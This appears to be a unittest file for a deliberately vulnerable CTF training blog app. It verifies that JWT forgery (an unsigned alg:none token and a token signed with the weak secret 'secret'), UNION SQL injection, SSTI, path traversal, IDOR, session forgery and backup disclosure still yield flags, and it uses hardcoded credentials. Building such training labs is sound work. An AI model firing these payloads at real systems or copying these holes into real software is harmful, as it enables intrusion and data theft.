# -*- coding: utf-8 -*-
"""Тесты ЛомБлога: JWT-контур (таск 8) и живучесть старых векторов.

Запуск: python -m unittest discover -s tests -v
"""
import base64
import json
import os
import sys
import unittest

# Чтобы `python -m unittest discover -s tests` видел app.py из корня проекта
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import jwt  # noqa: E402

import app as lab  # noqa: E402


def b64url(raw):
    """base64url без padding — как в JWT."""
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def make_alg_none_token(payload):
    """Собираем неподписанный токен руками: header.payload. (подпись пустая)."""
    header = {"alg": "none", "typ": "JWT"}
    return (b64url(json.dumps(header, separators=(",", ":")).encode())
            + "." + b64url(json.dumps(payload, separators=(",", ":")).encode())
            + ".")


class JwtApiTest(unittest.TestCase):
    def setUp(self):
        lab.app.config["TESTING"] = True
        self.client = lab.app.test_client()

    def login(self, username, password):
        r = self.client.post("/api/login",
                             json={"username": username, "password": password})
        self.assertEqual(r.status_code, 200, r.get_data(as_text=True))
        return r.get_json()

    def get_flag(self, token):
        return self.client.get(
            "/api/admin/flag",
            headers={"Authorization": "Bearer " + token})

    def test_admin_login_returns_valid_token_and_flag(self):
        data = self.login("admin", "admin2026!")
        self.assertEqual(data["role"], "admin")
        self.assertEqual(data["token_type"], "Bearer")
        payload = jwt.decode(data["token"], "secret", algorithms=["HS256"])
        self.assertEqual(payload, {"user": "admin", "role": "admin"})
        r = self.get_flag(data["token"])
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.get_json(), {"ok": True, "flag": lab.FLAG_JWT})

    def test_alg_none_token_grants_admin(self):
        token = make_alg_none_token({"user": "student", "role": "admin"})
        self.assertTrue(token.endswith("."))  # подписи нет вообще
        r = self.get_flag(token)
        self.assertEqual(r.status_code, 200, r.get_data(as_text=True))
        self.assertEqual(r.get_json()["flag"], lab.FLAG_JWT)

    def test_weak_secret_forged_token_grants_admin(self):
        # Секрет "secret" подбирается словарём — форжим токен без логина
        forged = jwt.encode({"user": "anonymous", "role": "admin"},
                            "secret", algorithm="HS256")
        r = self.get_flag(forged)
        self.assertEqual(r.status_code, 200, r.get_data(as_text=True))
        self.assertEqual(r.get_json()["flag"], lab.FLAG_JWT)

    def test_regular_user_is_not_admin(self):
        data = self.login("alice", "qwerty123")
        self.assertEqual(data["role"], "user")
        r = self.get_flag(data["token"])
        self.assertEqual(r.status_code, 403)

    def test_bad_or_missing_token_rejected(self):
        self.assertEqual(self.client.get("/api/admin/flag").status_code, 401)
        r = self.get_flag("not.a.jwt")
        self.assertEqual(r.status_code, 401)
        # Правильная структура, но подпись чужим ключом
        wrong = jwt.encode({"user": "x", "role": "admin"},
                           "wrong-secret", algorithm="HS256")
        self.assertEqual(self.get_flag(wrong).status_code, 401)


class OldVectorsTest(unittest.TestCase):
    """Старые уязвимости должны остаться на месте — стенд не «починили»."""

    def setUp(self):
        lab.app.config["TESTING"] = True
        self.client = lab.app.test_client()

    def test_idor_profile(self):
        r = self.client.get("/profile/1")
        self.assertEqual(r.status_code, 200)
        self.assertIn(lab.FLAG_IDOR, r.get_data(as_text=True))

    def test_stored_xss_flag_in_post_source(self):
        r = self.client.get("/post/1")
        self.assertEqual(r.status_code, 200)
        self.assertIn(lab.FLAG_XSS, r.get_data(as_text=True))

    def test_weak_session_key_admin(self):
        with self.client.session_transaction() as sess:
            sess["user_id"] = 1
            sess["username"] = "admin"
            sess["is_admin"] = 1
        r = self.client.get("/admin")
        self.assertEqual(r.status_code, 200)
        self.assertIn(lab.FLAG_KEY, r.get_data(as_text=True))

    def test_backup_disclosure(self):
        r = self.client.get("/backup/db.sql")
        self.assertEqual(r.status_code, 200)
        self.assertIn(lab.FLAG_BACKUP, r.get_data(as_text=True))

    def test_sqli_union(self):
        r = self.client.get("/search",
                            query_string={"q": "' UNION SELECT id,flag FROM secrets--"})
        self.assertEqual(r.status_code, 200)
        self.assertIn(lab.FLAG_SQLI, r.get_data(as_text=True))

    def test_ssti(self):
        r = self.client.get("/hello", query_string={"name": "{{config.FLAG_SSTI}}"})
        self.assertEqual(r.status_code, 200)
        self.assertIn(lab.FLAG_SSTI, r.get_data(as_text=True))

    def test_path_traversal(self):
        r = self.client.get("/download", query_string={"file": "../flag.txt"})
        self.assertEqual(r.status_code, 200)
        self.assertIn(lab.FLAG_TRAVERSAL, r.get_data(as_text=True))

    def test_jwt_flag_is_registered_in_game(self):
        # Таск 8 виден на главной и в рейтинге — как остальные задания
        with lab.app.app_context():
            row = lab.get_db().execute(
                "SELECT value, points FROM flags WHERE name='JWT'").fetchone()
        self.assertIsNotNone(row)
        self.assertEqual(row["value"], lab.FLAG_JWT)
        self.assertGreater(row["points"], 0)


if __name__ == "__main__":
    unittest.main()
